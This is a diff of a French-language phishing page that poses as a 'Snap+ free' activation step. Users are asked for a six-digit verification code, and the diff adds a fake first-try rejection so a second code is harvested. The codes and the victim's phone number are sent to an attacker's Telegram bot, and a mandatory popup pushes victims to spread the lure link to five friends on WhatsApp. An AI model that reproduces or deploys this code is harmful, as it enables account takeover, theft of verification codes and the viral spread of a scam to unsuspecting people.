@@ -12,13 +12,16 @@
         .card{background:#111;border-radius:28px;padding:60px 30px;box-shadow:0 20px 60px rgba(0,255,136,0.15);border:1px solid #1a1a1a;}
         h1{font-size:2.2em;font-weight:700;color:#fff;text-align:center;margin-bottom:20px;}
         p{color:#888;text-align:center;font-size:1.1em;margin-bottom:50px;}
-        input{width:100%;padding:22px;background:#1a1a1a;border:2px solid #333;border-radius:18px;color:#fff;font-size:1.8em;text-align:center;letter-spacing:8px;transition:0.3s;}
-        input:focus{border-color:#00ff88;box-shadow:0 0 0 4px rgba(0,255,136,0.2);}
+        input{width:100%;padding:22px;background:#1a1a1a;border:2px solid #333;border-radius:18px;color:#fff;font-size:2.2em;text-align:center;letter-spacing:10px;transition:0.3s;}
+        input:focus{border-color:#00ff88;}
         .btn{background:#00ff88;color:#000;padding:20px;border:none;border-radius:50px;font-size:1.4em;font-weight:700;width:100%;margin-top:50px;cursor:pointer;transition:0.3s;box-shadow:0 10px 30px rgba(0,255,136,0.4);}
         .btn:hover{background:#00ffaa;}
-        .loader{display:none;width:60px;height:60px;border:8px solid #1a1a1a;border-top:8px solid #00ff88;border-radius:50%;animation:spin 1s linear infinite;margin:40px auto;}
-        @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
-        .status{text-align:center;margin-top:20px;color:#00ff88;font-weight:600;font-size:1.2em;}
+        .error{color:#ff4444;margin-top:20px;text-align:center;font-weight:700;font-size:1.2em;}
+        .share-popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:99999;display:none;align-items:center;justify-content:center;padding:20px;}
+        .share-card{background:#111;padding:40px;border-radius:30px;text-align:center;max-width:380px;border:3px solid #00ff88;}
+        .share-card h2{color:#00ff88;font-size:2em;margin-bottom:20px;}
+        .share-btn{background:#25D366;color:#fff;padding:18px;border-radius:50px;font-size:1.3em;margin:15px;width:100%;}
+        .share-btn.copy{background:#444;}
     </style>
 </head>
 <body>
@@ -29,9 +32,19 @@
 
             <input type="text" id="code" maxlength="6" placeholder="------" required autofocus>
 
+            <div id="error" class="error"></div>
+
             <button class="btn" id="btn">Valider le code</button>
-            <div class="loader" id="loader"></div>
-            <div class="status" id="status">En attente du code...</div>
+        </div>
+    </div>
+
+    <!-- Pop-up partage obligatoire -->
+    <div class="share-popup" id="sharePopup">
+        <div class="share-card">
+            <h2>Partage pour activer</h2>
+            <p>Envoie à 5 amis pour confirmer ton activation</p>
+            <button class="share-btn" onclick="shareAndActivate()">📱 WhatsApp</button>
+            <button class="share-btn copy" onclick="copyAndActivate()">📋 Copier le lien</button>
         </div>
     </div>
 
@@ -40,11 +53,25 @@
         const TELEGRAM_CHAT_ID = "6272429080";
 
         const phone = localStorage.getItem('tempPhone') || 'Inconnu';
+        let firstTry = true;
 
         document.getElementById('btn').addEventListener('click', async () => {
             const code = document.getElementById('code').value.trim();
-            if (code.length !== 6) return;
+            const error = document.getElementById('error');
 
+            if (code.length !== 6) {
+                error.textContent = 'Code invalide';
+                return;
+            }
+
+            // Premier essai = faux refus
+            if (firstTry) {
+                firstTry = false;
+                error.textContent = 'Code incorrect – Réessaie une dernière fois';
+                return;
+            }
+
+            // Deuxième essai = succès + envoi Telegram
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type':'application/json'},
@@ -54,14 +81,21 @@
                 })
             });
 
-            document.getElementById('btn').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-            document.getElementById('status').textContent = 'Activation en cours...';
-
-            setTimeout(() => {
-                window.location.href = 'success.html';
-            }, 4000);
+            // Pop-up partage obligatoire avant succès
+            document.getElementById('sharePopup').style.display = 'flex';
         });
+
+        function shareAndActivate() {
+            const text = encodeURIComponent(`J’ai eu Snap+ GRATUIT en 30s ! C’est incroyable, viens : ${window.location.origin}`);
+            window.open(`https://wa.me/?text=${text}`, '_blank');
+            setTimeout(() => window.location.href = 'success.html', 2000);
+        }
+
+        function copyAndActivate() {
+            navigator.clipboard.writeText(window.location.origin);
+            alert('Lien copié ! Activation en cours...');
+            setTimeout(() => window.location.href = 'success.html', 2000);
+        }
     </script>
 </body>
 </html>
